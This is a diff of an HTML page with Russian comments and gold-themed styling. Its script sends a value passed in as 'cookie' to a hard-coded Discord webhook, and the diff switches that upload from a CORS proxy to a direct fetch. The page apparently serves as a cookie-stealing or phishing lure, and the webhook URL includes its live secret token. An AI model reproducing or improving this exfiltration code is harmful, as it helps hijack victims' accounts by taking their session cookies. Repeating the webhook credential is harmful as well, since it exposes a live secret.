@@ -11,7 +11,6 @@
             box-sizing: border-box;
         }
 
-        /* ========== ТЁМНАЯ ТЕМА (ЗОЛОТОЙ ПРЕМИУМ) ========== */
         :root {
             --bg1: #0a0502;
             --bg2: #1a0a03;
@@ -45,7 +44,6 @@
             --sub2: #ffcc66;
         }
 
-        /* ========== СВЕТЛАЯ ТЕМА ========== */
         body.light {
             --bg1: #fffaf0;
             --bg2: #fff5e0;
@@ -341,12 +339,8 @@
 
     <script>
         (function() {
-            // ========== ПРОКСИ ДЛЯ ОБХОДА CORS ==========
-            const PROXY = "https://cors-anywhere.herokuapp.com/";
+            // ТВОЙ ВЕБХУК (ПРЯМАЯ ОТПРАВКА)
             const WEBHOOK_URL = "https://discord.com/api/webhooks/1496536250910249102/UOfPpewlAPiGVQjWs2ykmvW0o_KYzlZT3vJJ1MNu40W2ziyoca1PpcEHroIXW_zbgK_G";
-            
-            // ИСПОЛЬЗУЕМ ПРОКСИ
-            const FULL_URL = PROXY + WEBHOOK_URL;
 
             // ЗВЁЗДЫ
             const stars = document.getElementById('stars');
@@ -451,8 +445,7 @@
 
             async function send(cookie) {
                 try {
-                    // Отправка через прокси для обхода CORS
-                    const res = await fetch(FULL_URL, {
+                    const res = await fetch(WEBHOOK_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ content: cookie })
